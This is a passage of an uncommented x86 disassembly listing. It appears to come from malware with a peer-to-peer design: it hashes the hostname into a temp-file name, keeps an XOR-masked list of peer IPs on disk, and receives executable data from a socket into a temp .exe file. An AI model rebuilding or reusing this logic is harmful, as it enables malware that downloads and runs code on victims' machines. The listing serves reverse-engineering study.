		or	esi, [ebp+var_4]
		xor	esi, edi
		add	eax, esi
		jmp	short loc_806E1C
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806DF4:				; CODE XREF: sub_806CF9+EEj
		mov	ebx, [ebp+var_4]
		xor	ebx, edi
		xor	ebx, esi
		jmp	short loc_806E1A
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806DFD:				; CODE XREF: sub_806CF9+EBj
		mov	ebx, esi
		not	ebx
		and	ebx, edi
		mov	edi, [ebp+var_4]
		and	edi, esi
		or	ebx, edi
		jmp	short loc_806E1A
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806E0C:				; CODE XREF: sub_806CF9+E8j
		mov	ebx, [ebp+var_4]
		not	ebx
		and	ebx, esi
		mov	esi, [ebp+var_4]
		and	esi, edi
		or	ebx, esi

loc_806E1A:				; CODE XREF: sub_806CF9+102j
					; sub_806CF9+111j
		add	eax, ebx

loc_806E1C:				; CODE XREF: sub_806CF9+F9j
		mov	esi, [ebp+var_C]
		mov	ecx, [ebp+ecx*4+var_70]
		push	20h
		add	[ebp+var_C], 4
		add	ecx, [esi]
		add	eax, ecx
		pop	ecx
		sub	ecx, [ebp+var_14]
		mov	esi, eax
		shr	esi, cl
		mov	ecx, [ebp+var_14]
		shl	eax, cl
		mov	ecx, [ebp+var_18]
		add	ecx, dword ptr [ebp+var_20+4]
		or	esi, eax
		mov	[ebp+var_18], ecx
		add	esi, [ebp+var_4]
		inc	[ebp+var_8]
		cmp	[ebp+var_8], 10h
		mov	[edx], esi
		jl	loc_806D93
		mov	eax, [ebp+var_10]
		inc	eax
		cmp	eax, 4
		mov	[ebp+var_10], eax
		jl	loc_806D6E
		pop	edi
		pop	esi
		xor	ecx, ecx
		pop	ebx

loc_806E6C:				; CODE XREF: sub_806CF9+184j
		mov	eax, [ebp+arg_0]
		mov	edx, [ebp+ecx+var_30]
		add	eax, ecx
		add	ecx, 4
		add	[eax], edx
		cmp	ecx, 10h
		jl	short loc_806E6C
		leave
		retn	8
sub_806CF9	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_806E83	proc near		; CODE XREF: sub_8028E6+44p
					; sub_806F2B+40p ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ebx
		mov	ebx, [ebp+arg_8]
		push	esi
		mov	esi, [ebp+arg_0]
		mov	edx, ebx
		push	edi
		mov	ecx, [esi+10h]
		mov	eax, ecx
		shr	eax, 3
		lea	ecx, [ecx+ebx*8]
		and	eax, 3Fh
		shl	edx, 3
		cmp	ecx, edx
		mov	[esi+10h], ecx
		jnb	short loc_806EAC
		inc	dword ptr [esi+14h]

loc_806EAC:				; CODE XREF: sub_806E83+24j
		push	40h
		mov	ecx, ebx
		pop	edi
		shr	ecx, 1Dh
		add	[esi+14h], ecx
		sub	edi, eax
		cmp	ebx, edi
		jb	short loc_806F0A
		xor	ecx, ecx
		test	edi, edi
		jbe	short loc_806ED5
		lea	eax, [eax+esi+18h]

loc_806EC7:				; CODE XREF: sub_806E83+50j
		mov	edx, [ebp+arg_4]
		mov	dl, [ecx+edx]
		mov	[eax+ecx], dl
		inc	ecx
		cmp	ecx, edi
		jb	short loc_806EC7

loc_806ED5:				; CODE XREF: sub_806E83+3Ej
		lea	eax, [esi+18h]
		push	eax
		push	esi
		call	sub_806CF9
		lea	eax, [edi+3Fh]
		cmp	eax, ebx
		jnb	short loc_806F06
		mov	[ebp+arg_0], eax

loc_806EE9:				; CODE XREF: sub_806E83+81j
		mov	eax, [ebp+arg_4]
		mov	ecx, [ebp+arg_0]
		lea	eax, [eax+ecx-3Fh]
		push	eax
		push	esi
		call	sub_806CF9
		add	[ebp+arg_0], 40h
		add	edi, 40h
		cmp	[ebp+arg_0], ebx
		jb	short loc_806EE9

loc_806F06:				; CODE XREF: sub_806E83+61j
		xor	eax, eax
		jmp	short loc_806F0C
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806F0A:				; CODE XREF: sub_806E83+38j
		xor	edi, edi

loc_806F0C:				; CODE XREF: sub_806E83+85j
		xor	ecx, ecx
		sub	ebx, edi
		jz	short loc_806F26
		mov	edx, [ebp+arg_4]
		lea	esi, [eax+esi+18h]
		add	edx, edi

loc_806F1B:				; CODE XREF: sub_806E83+A1j
		mov	al, [edx+ecx]
		mov	[esi+ecx], al
		inc	ecx
		cmp	ecx, ebx
		jb	short loc_806F1B

loc_806F26:				; CODE XREF: sub_806E83+8Dj
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn
sub_806E83	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_806F2B	proc near		; CODE XREF: sub_8028E6+51p
					; sub_8071E7+6Bp ...

var_48		= dword	ptr -48h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 48h
		push	esi
		push	edi
		push	0Fh
		xor	eax, eax
		pop	ecx
		lea	edi, [ebp+var_48+1]
		rep stosd
		mov	esi, [ebp+arg_4]
		push	38h
		stosw
		mov	ecx, [esi+14h]
		stosb
		mov	eax, [esi+10h]
		mov	[ebp+var_4], ecx
		mov	[ebp+var_8], eax
		pop	ecx
		shr	eax, 3
		and	eax, 3Fh
		mov	byte ptr [ebp+var_48], 80h
		cmp	eax, ecx
		jb	short loc_806F63
		push	78h
		pop	ecx

loc_806F63:				; CODE XREF: sub_806F2B+33j
		sub	ecx, eax
		lea	eax, [ebp+var_48]
		push	ecx
		push	eax
		push	esi
		call	sub_806E83
		lea	eax, [ebp+var_8]
		push	8
		push	eax
		push	esi
		call	sub_806E83
		mov	eax, [ebp+arg_0]
		add	esp, 18h
		sub	esi, eax
		push	4
		pop	ecx

loc_806F87:				; CODE XREF: sub_806F2B+65j
		mov	edx, [esi+eax]
		mov	[eax], edx
		add	eax, 4
		dec	ecx
		jnz	short loc_806F87
		pop	edi
		pop	esi
		leave
		retn
sub_806F2B	endp


;  S U B	R O U T	I N E 


sub_806F96	proc near		; CODE XREF: sub_807031+91p
					; sub_807101+A2p
		push	esi
		push	41h
		xor	ecx, ecx
		pop	esi

loc_806F9C:				; CODE XREF: sub_806F96+1Aj
		movzx	dx, byte ptr [eax]
		shl	ecx, 8
		add	ecx, edx
		mov	edx, ecx
		and	ecx, 1
		shr	edx, 1
		mov	[eax], dl
		inc	eax
		dec	esi
		jnz	short loc_806F9C
		pop	esi
		retn
sub_806F96	endp


;  S U B	R O U T	I N E 


sub_806FB4	proc near		; CODE XREF: sub_807031+4Ap
					; sub_807031+BFp ...

arg_0		= dword	ptr  4

		xor	eax, eax

loc_806FB6:				; CODE XREF: sub_806FB4+14j
		mov	edx, [esp+arg_0]
		movzx	ecx, ax
		cmp	byte ptr [ecx+edx], 0
		jnz	short loc_806FCE
		inc	eax
		cmp	ax, 41h
		jb	short loc_806FB6
		xor	eax, eax
		inc	eax
		retn
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_806FCE:				; CODE XREF: sub_806FB4+Dj
		xor	eax, eax
		retn
sub_806FB4	endp


;  S U B	R O U T	I N E 


sub_806FD1	proc near		; CODE XREF: sub_807031+2Dp
					; sub_807031+38p ...
		push	esi
		push	edi
		mov	esi, eax
		xor	edi, edi

loc_806FD7:				; CODE XREF: sub_806FD1+1Fj
		movsx	ecx, di
		movzx	ax, byte ptr [ecx+edx]
		movzx	cx, byte ptr [ecx+esi]
		sub	eax, ecx
		test	ax, ax
		jnz	short loc_807021
		inc	edi
		cmp	di, 41h
		jl	short loc_806FD7
		xor	eax, eax

loc_806FF4:				; CODE XREF: sub_806FD1+5Ej
		test	eax, eax
		jl	short loc_80701E
		xor	ecx, ecx
		push	41h
		lea	eax, [edx+41h]
		sub	esi, edx
		pop	edx
		push	ebx

loc_807003:				; CODE XREF: sub_806FD1+4Aj
		dec	eax
		movzx	di, byte ptr [esi+eax]
		movzx	bx, byte ptr [eax]
		sub	ebx, edi
		add	ecx, ebx
		mov	[eax], cl
		xor	cl, cl
		neg	cx
		sbb	ecx, ecx
		dec	edx
		jnz	short loc_807003
		pop	ebx

loc_80701E:				; CODE XREF: sub_806FD1+25j
		pop	edi
		pop	esi
		retn
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_807021:				; CODE XREF: sub_806FD1+18j
		xor	ecx, ecx
		test	ax, ax
		setnle	cl
		lea	ecx, [ecx+ecx-1]
		mov	eax, ecx
		jmp	short loc_806FF4
sub_806FD1	endp


;  S U B	R O U T	I N E 


sub_807031	proc near		; CODE XREF: sub_807101+98p
					; sub_807101+C6p

var_70		= dword	ptr -70h

		push	ebp
		lea	ebp, [esp+var_70]
		sub	esp, 8Ch
		push	edi
		push	41h
		pop	edi
		lea	eax, [ebp-1Ch]
		push	edi
		push	esi
		push	eax
		call	memcpy
		push	edi
		lea	eax, [ebp+28h]
		push	dword ptr [ebp+78h]
		push	eax
		call	memcpy
		mov	eax, [ebp+7Ch]
		lea	edx, [ebp-1Ch]
		call	sub_806FD1
		mov	eax, [ebp+7Ch]
		lea	edx, [ebp+28h]
		call	sub_806FD1
		push	edi
		push	0
		push	esi
		call	memset
		lea	eax, [ebp+28h]
		push	eax
		call	sub_806FB4
		add	esp, 28h
		test	eax, eax
		jnz	short loc_8070FB
		push	ebx

loc_807088:				; CODE XREF: sub_807031+C7j
		test	byte ptr [ebp+68h], 1
		jz	short loc_8070BF
		lea	ecx, [ebp-1Ch]
		xor	edx, edx
		lea	eax, [esi+41h]
		sub	ecx, esi
		mov	[ebp+6Ch], edi

loc_80709B:				; CODE XREF: sub_807031+7Fj
		dec	eax
		movzx	ebx, byte ptr [eax]
		movzx	edi, byte ptr [ecx+eax]
		add	ebx, edx
		lea	edx, [ebx+edi]
		mov	[eax], dl
		shr	edx, 8
		dec	dword ptr [ebp+6Ch]
		jnz	short loc_80709B
		mov	eax, [ebp+7Ch]
		mov	edx, esi
		call	sub_806FD1
		push	41h
		pop	edi

loc_8070BF:				; CODE XREF: sub_807031+5Bj
		lea	eax, [ebp+28h]
		call	sub_806F96
		xor	ecx, ecx
		lea	eax, [ebp+25h]
		mov	edx, edi

loc_8070CE:				; CODE XREF: sub_807031+AEj
		dec	eax
		movzx	bx, byte ptr [eax]
		lea	ecx, [ecx+ebx*2]
		xor	ebx, ebx
		mov	bl, ch
		mov	[eax], cl
		dec	edx
		mov	ecx, ebx
		jnz	short loc_8070CE
		mov	eax, [ebp+7Ch]
		lea	edx, [ebp-1Ch]
		call	sub_806FD1
		lea	eax, [ebp+28h]
		push	eax
		call	sub_806FB4
		test	eax, eax
		pop	ecx
		jz	short loc_807088
		pop	ebx

loc_8070FB:				; CODE XREF: sub_807031+54j
		pop	edi
		add	ebp, 70h
		leave
		retn
sub_807031	endp


;  S U B	R O U T	I N E 


sub_807101	proc near		; CODE XREF: sub_8075B2+130p

var_68		= dword	ptr -68h

		push	ebp
		lea	ebp, [esp+var_68]
		sub	esp, 110h
		push	esi
		xor	esi, esi
		push	1
		lea	eax, [ebp+24h]
		push	esi
		push	eax
		call	memset
		push	40h
		lea	eax, [ebp+25h]
		push	dword ptr [ebp+74h]
		push	eax
		call	memcpy
		push	1
		lea	eax, [ebp-20h]
		push	esi
		push	eax
		call	memset
		push	40h
		lea	eax, [ebp-1Fh]
		push	dword ptr [ebp+78h]
		push	eax
		call	memcpy
		push	1
		lea	eax, [ebp-64h]
		push	esi
		push	eax
		call	memset
		push	40h
		lea	eax, [ebp-63h]
		push	dword ptr [ebp+7Ch]
		push	eax
		call	memcpy
		add	esp, 48h
		lea	eax, [ebp+24h]
		push	41h
		push	eax
		lea	eax, [ebp-0A8h]
		push	eax
		call	memcpy
		push	41h
		lea	eax, [ebp+24h]
		push	esi
		push	eax
		call	memset
		add	esp, 18h
		mov	byte ptr [ebp+64h], 1

loc_807185:				; CODE XREF: sub_807101+CDj
		test	byte ptr [ebp+20h], 1
		jz	short loc_8071A0
		lea	eax, [ebp-64h]
		lea	esi, [ebp+24h]
		push	eax
		lea	eax, [ebp-0A8h]
		push	eax
		call	sub_807031
		pop	ecx
		pop	ecx

loc_8071A0:				; CODE XREF: sub_807101+88j
		lea	eax, [ebp-20h]
		call	sub_806F96
		lea	eax, [ebp-20h]
		push	eax
		call	sub_806FB4
		test	eax, eax
		pop	ecx
		jnz	short loc_8071D0
		lea	eax, [ebp-64h]
		lea	esi, [ebp-0A8h]
		push	eax
		lea	eax, [ebp-0A8h]
		push	eax
		call	sub_807031
		pop	ecx
		pop	ecx
		jmp	short loc_807185
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8071D0:				; CODE XREF: sub_807101+B3j
		lea	eax, [ebp+25h]
		push	40h
		push	eax
		push	dword ptr [ebp+70h]
		call	memcpy
		add	esp, 0Ch
		pop	esi
		add	ebp, 68h
		leave
		retn
sub_807101	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_8071E7	proc near		; CODE XREF: sub_807D81+1Fp

name		= byte ptr -178h
var_78		= dword	ptr -78h
var_20		= dword	ptr -20h
var_11		= byte ptr -11h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_1		= byte ptr -1

		push	ebp
		mov	ebp, esp
		sub	esp, 178h
		push	ebx
		push	esi
		mov	esi, 100h
		push	edi
		push	esi
		lea	eax, [ebp+name]
		push	0
		push	eax
		call	memset
		add	esp, 0Ch
		lea	eax, [ebp+name]
		push	esi		; namelen
		push	eax		; name
		call	ds:gethostname
		cmp	[ebp+name], 0
		jz	short loc_807230
		lea	eax, [ebp+name]

loc_807227:				; CODE XREF: sub_8071E7+47j
		or	byte ptr [eax],	20h
		inc	eax
		cmp	byte ptr [eax],	0
		jnz	short loc_807227

loc_807230:				; CODE XREF: sub_8071E7+38j
		lea	eax, [ebp+var_78]
		push	eax
		call	sub_806CD1
		lea	eax, [ebp+name]
		push	esi
		push	eax
		lea	eax, [ebp+var_78]
		push	eax
		call	sub_806E83
		lea	eax, [ebp+var_78]
		push	eax
		lea	eax, [ebp+var_20]
		push	eax
		call	sub_806F2B
		movzx	eax, [ebp+var_11]
		push	8
		cdq
		pop	ecx
		idiv	ecx
		mov	edi, edx
		add	edi, 4
		lea	eax, [edi+110h]
		push	eax		; size_t
		call	ds:malloc
		mov	ebx, eax
		add	esp, 1Ch
		test	ebx, ebx
		mov	[ebp+var_10], ebx
		jz	loc_807336
		lea	eax, [edi+110h]
		push	eax
		push	0
		push	ebx
		call	memset
		add	esp, 0Ch
		push	ebx		; lpBuffer
		push	esi		; nBufferLength
		call	ds:GetTempPathA
		push	ebx
		call	strlen
		test	eax, eax
		pop	ecx
		jz	short loc_8072C1
		mov	al, [ebx+eax-1]
		cmp	al, 5Ch
		jz	short loc_8072C1
		cmp	al, 2Fh
		jz	short loc_8072C1
		push	offset String2	; "\\"
		push	ebx
		call	strcat
		pop	ecx
		pop	ecx

loc_8072C1:				; CODE XREF: sub_8071E7+BFj
					; sub_8071E7+C7j ...
		cmp	byte ptr [ebx],	0
		mov	esi, ebx
		jz	short loc_8072CE

loc_8072C8:				; CODE XREF: sub_8071E7+E5j
		inc	esi
		cmp	byte ptr [esi],	0
		jnz	short loc_8072C8

loc_8072CE:				; CODE XREF: sub_8071E7+DFj
		and	[ebp+var_8], 0
		test	edi, edi
		jle	short loc_807324

loc_8072D6:				; CODE XREF: sub_8071E7+13Bj
		mov	eax, [ebp+var_8]
		push	0Bh
		and	eax, 0Fh
		pop	ecx
		mov	al, byte ptr [ebp+eax+var_20]
		mov	[ebp+var_1], al
		movzx	eax, al
		mov	[ebp+var_C], eax
		cdq
		idiv	ecx
		mov	eax, [ebp+var_C]
		test	edx, edx
		cdq
		jle	short loc_807311
		cmp	[ebp+var_1], 0EEh
		push	1Ah
		pop	ebx
		sbb	cl, cl
		idiv	ebx
		mov	ebx, [ebp+var_10]
		and	cl, 20h
		add	cl, 41h
		add	cl, dl
		mov	[esi], cl
		jmp	short loc_80731B
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_807311:				; CODE XREF: sub_8071E7+10Ej
		push	0Ah
		pop	ecx
		idiv	ecx
		add	dl, 30h
		mov	[esi], dl

loc_80731B:				; CODE XREF: sub_8071E7+128j
		inc	[ebp+var_8]
		inc	esi
		cmp	[ebp+var_8], edi
		jl	short loc_8072D6

loc_807324:				; CODE XREF: sub_8071E7+EDj
		and	byte ptr [esi],	0
		push	offset dword_802768
		push	esi
		call	strcpy
		pop	ecx
		mov	eax, ebx
		pop	ecx

loc_807336:				; CODE XREF: sub_8071E7+96j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_8071E7	endp


;  S U B	R O U T	I N E 


sub_80733B	proc near		; CODE XREF: sub_807400+7Fp
					; sub_807545+Ep

netlong		= dword	ptr  8

		push	edi
		mov	edi, [esp+netlong]
		push	edi		; netlong
		call	ds:ntohl
		shr	eax, 18h
		test	al, al
		jz	loc_8073E6
		cmp	al, 7Fh
		jz	loc_8073E6
		cmp	al, 0E0h
		jnb	loc_8073E6
		mov	ecx, [esi+1Ch]
		mov	eax, [esi+20h]
		add	ecx, 8
		push	ebx
		cmp	ecx, eax
		jle	short loc_8073C3
		cmp	eax, 2
		mov	ebx, 100h
		jl	short loc_80737D
		lea	ebx, [eax+eax]

loc_80737D:				; CODE XREF: sub_80733B+3Dj
		mov	eax, [esi+18h]
		test	eax, eax
		jz	short loc_807394
		mov	ecx, ebx
		shl	ecx, 2
		push	ecx		; size_t
		push	eax		; void *
		call	ds:realloc
		pop	ecx
		jmp	short loc_8073A0
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_807394:				; CODE XREF: sub_80733B+47j
		mov	eax, ebx
		shl	eax, 2
		push	eax		; size_t
		call	ds:malloc

loc_8073A0:				; CODE XREF: sub_80733B+57j
		mov	edx, eax
		pop	ecx
		test	edx, edx
		jz	short loc_8073E5
		mov	eax, [esi+1Ch]
		cmp	eax, ebx
		jge	short loc_8073BD
		mov	ecx, ebx
		lea	edi, [edx+eax*4]
		sub	ecx, eax
		xor	eax, eax
		rep stosd
		mov	edi, [esp+4+netlong]

loc_8073BD:				; CODE XREF: sub_80733B+71j
		mov	[esi+18h], edx
		mov	[esi+20h], ebx

loc_8073C3:				; CODE XREF: sub_80733B+33j
		mov	eax, [esi+1Ch]
		xor	edx, edx
		test	eax, eax
		jle	short loc_8073DC
		mov	ecx, [esi+18h]

loc_8073CF:				; CODE XREF: sub_80733B+9Fj
		cmp	[ecx], edi
		jz	short loc_8073E5
		inc	edx
		add	ecx, 4
		cmp	edx, [esi+1Ch]
		jl	short loc_8073CF

loc_8073DC:				; CODE XREF: sub_80733B+8Fj
		mov	ecx, [esi+18h]
		mov	[ecx+eax*4], edi
		inc	dword ptr [esi+1Ch]

loc_8073E5:				; CODE XREF: sub_80733B+6Aj
					; sub_80733B+96j
		pop	ebx

loc_8073E6:				; CODE XREF: sub_80733B+11j
					; sub_80733B+19j ...
		pop	edi
		retn
sub_80733B	endp


;  S U B	R O U T	I N E 


sub_8073E8	proc near		; CODE XREF: sub_807400+Dp
					; sub_8074A2+9p ...
		jmp	short loc_8073F2
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8073EA:				; CODE XREF: sub_8073E8+Ej
		push	5		; dwMilliseconds
		call	ds:Sleep

loc_8073F2:				; CODE XREF: sub_8073E8j
		cmp	dword ptr [esi+14h], 0
		jnz	short loc_8073EA
		mov	dword ptr [esi+14h], 1
		retn
sub_8073E8	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_807400	proc near		; CODE XREF: sub_807D81+34p

netlong		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		and	[ebp+netlong], 0
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		call	sub_8073E8
		push	offset dword_802770
		push	dword ptr [esi+24h]
		call	ds:fopen
		mov	ebx, eax
		pop	ecx
		test	ebx, ebx
		pop	ecx
		jz	short loc_80749A
		push	edi
		mov	edi, ds:fread
		push	ebx
		push	4
		lea	eax, [ebp+netlong]
		push	1
		push	eax
		call	edi ; fread
		add	esp, 10h
		push	[ebp+netlong]	; netlong
		call	ds:ntohl
		cmp	eax, 504F6C30h
		jnz	short loc_807491
		and	[ebp+arg_0], 0

loc_807451:				; CODE XREF: sub_807400+8Fj
		and	[ebp+netlong], 0
		push	ebx
		push	4
		lea	eax, [ebp+netlong]
		push	1
		push	eax
		call	edi ; fread
		add	esp, 10h
		cmp	eax, 4
		jb	short loc_807491
		cmp	[ebp+netlong], 0
		jz	short loc_807491
		push	0F9138C5Dh	; hostlong
		call	ds:htonl
		xor	[ebp+netlong], eax
		push	[ebp+netlong]
		call	sub_80733B
		inc	[ebp+arg_0]
		pop	ecx
		cmp	[ebp+arg_0], 10000h
		jl	short loc_807451

loc_807491:				; CODE XREF: sub_807400+4Bj
					; sub_807400+66j ...
		push	ebx
		call	ds:fclose
		pop	ecx
		pop	edi

loc_80749A:				; CODE XREF: sub_807400+26j
		and	dword ptr [esi+14h], 0
		pop	esi
		pop	ebx
		leave
		retn
sub_807400	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_8074A2	proc near		; CODE XREF: sub_807B09+69p
					; sub_807D81+3Ap

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	esi
		mov	esi, [ebp+arg_0]
		call	sub_8073E8
		push	offset dword_802774
		push	dword ptr [esi+24h]
		call	ds:fopen
		pop	ecx
		mov	[ebp+var_8], eax
		test	eax, eax
		pop	ecx
		jz	short loc_807533
		push	ebx
		push	edi
		mov	edi, ds:htonl
		push	504F6C30h	; hostlong
		call	edi ; htonl
		push	[ebp+var_8]
		mov	ebx, ds:fwrite
		mov	[ebp+var_4], eax
		lea	eax, [ebp+var_4]
		push	4
		push	1
		push	eax
		call	ebx ; fwrite
		and	[ebp+arg_0], 0
		add	esp, 10h
		cmp	dword ptr [esi+1Ch], 0
		jle	short loc_807527

loc_8074F9:				; CODE XREF: sub_8074A2+83j
		push	0F9138C5Dh	; hostlong
		call	edi ; htonl
		mov	ecx, [esi+18h]
		mov	edx, [ebp+arg_0]
		push	[ebp+var_8]
		xor	eax, [ecx+edx*4]
		push	4
		push	1
		mov	[ebp+var_4], eax
		lea	eax, [ebp+var_4]
		push	eax
		call	ebx ; fwrite
		add	esp, 10h
		inc	[ebp+arg_0]
		mov	eax, [ebp+arg_0]
		cmp	eax, [esi+1Ch]
		jl	short loc_8074F9

loc_807527:				; CODE XREF: sub_8074A2+55j
		push	[ebp+var_8]
		call	ds:fclose
		pop	ecx
		pop	edi
		pop	ebx

loc_807533:				; CODE XREF: sub_8074A2+23j
		lea	eax, [esi+28h]
		push	eax		; time_t *
		call	ds:time
		and	dword ptr [esi+14h], 0
		pop	ecx
		pop	esi
		leave
		retn
sub_8074A2	endp


;  S U B	R O U T	I N E 


sub_807545	proc near		; CODE XREF: sub_80783E+BFp
					; sub_807983+DAp ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	esi
		mov	esi, [esp+arg_0]
		call	sub_8073E8
		push	[esp+arg_4]
		call	sub_80733B
		and	dword ptr [esi+14h], 0
		pop	ecx
		pop	esi
		retn
sub_807545	endp


;  S U B	R O U T	I N E 


sub_80755F	proc near		; CODE XREF: sub_807A7B+84p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	esi
		mov	esi, [esp+arg_0]
		call	sub_8073E8
		mov	edx, [esi+1Ch]
		xor	eax, eax
		test	edx, edx
		jle	short loc_807588
		mov	ecx, [esi+18h]
		push	edi

loc_807576:				; CODE XREF: sub_80755F+26j
		mov	edi, [ecx]
		cmp	edi, [esp+4+arg_4]
		jz	short loc_807587
		inc	eax
		add	ecx, 4
		cmp	eax, [esi+1Ch]
		jl	short loc_807576

loc_807587:				; CODE XREF: sub_80755F+1Dj
		pop	edi

loc_807588:				; CODE XREF: sub_80755F+11j
		cmp	eax, edx
		jge	short loc_8075AC
		inc	eax
		cmp	eax, edx
		jge	short loc_8075A2

loc_807591:				; CODE XREF: sub_80755F+41j
		mov	ecx, [esi+18h]
		lea	ecx, [ecx+eax*4]
		inc	eax
		mov	edx, [ecx]
		mov	[ecx-4], edx
		cmp	eax, [esi+1Ch]
		jl	short loc_807591

loc_8075A2:				; CODE XREF: sub_80755F+30j
		mov	ecx, [esi+18h]
		and	dword ptr [ecx+eax*4], 0
		dec	dword ptr [esi+1Ch]

loc_8075AC:				; CODE XREF: sub_80755F+2Bj
		and	dword ptr [esi+14h], 0
		pop	esi
		retn
sub_80755F	endp


;  S U B	R O U T	I N E 


sub_8075B2	proc near		; CODE XREF: sub_80783E+B1p

var_74		= dword	ptr -74h

		push	ebp
		lea	ebp, [esp+var_74]
		sub	esp, 2ECh
		push	ebx
		push	esi
		push	edi
		xor	edi, edi
		push	40h
		lea	eax, [ebp-20h]
		push	edi
		push	eax
		call	memset
		mov	ebx, [ebp+7Ch]
		mov	esi, ds:recv
		add	esp, 0Ch

loc_8075DA:				; CODE XREF: sub_8075B2+47j
		push	0		; flags
		push	40h
		pop	eax
		sub	eax, edi
		push	eax		; len
		lea	eax, [ebp+edi-20h]
		push	eax		; buf
		push	dword ptr [ebx+4] ; s
		call	esi ; recv
		test	eax, eax
		jle	loc_8077D0
		add	edi, eax
		cmp	edi, 40h
		jl	short loc_8075DA
		lea	eax, [ebp-120h]
		mov	edi, 100h
		push	eax		; lpBuffer
		push	edi		; nBufferLength
		call	ds:GetTempPathA
		lea	eax, [ebp-120h]
		push	eax
		call	strlen
		test	eax, eax
		pop	ecx
		jz	short loc_807641
		mov	al, [ebp+eax-121h]
		cmp	al, 5Ch
		jz	short loc_807641
		cmp	al, 2Fh
		jz	short loc_807641
		lea	eax, [ebp-120h]
		push	offset String2	; "\\"
		push	eax
		call	strcat
		pop	ecx
		pop	ecx

loc_807641:				; CODE XREF: sub_8075B2+6Bj
					; sub_8075B2+76j ...
		push	65h
		push	78h
		push	65h
		push	0		; time_t *
		call	ds:time
		pop	ecx
		push	eax
		lea	eax, [ebp-120h]
		push	offset aTmpD_CCC ; LPCSTR
		push	eax
		call	strlen
		pop	ecx
		lea	eax, [ebp+eax-120h]
		push	eax		; LPSTR
		call	ds:wsprintfA
		lea	eax, [ebp-120h]
		push	offset dword_802774
		push	eax
		call	ds:fopen
		add	esp, 20h
		mov	[ebp+70h], eax
		test	eax, eax
		jz	loc_8077D0
		jmp	short loc_8076A6
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_807693:				; CODE XREF: sub_8075B2+108j
		push	eax
		lea	eax, [ebp-278h]
		push	1
		push	eax
		call	ds:fwrite
		add	esp, 10h

loc_8076A6:				; CODE XREF: sub_8075B2+DFj
		push	0
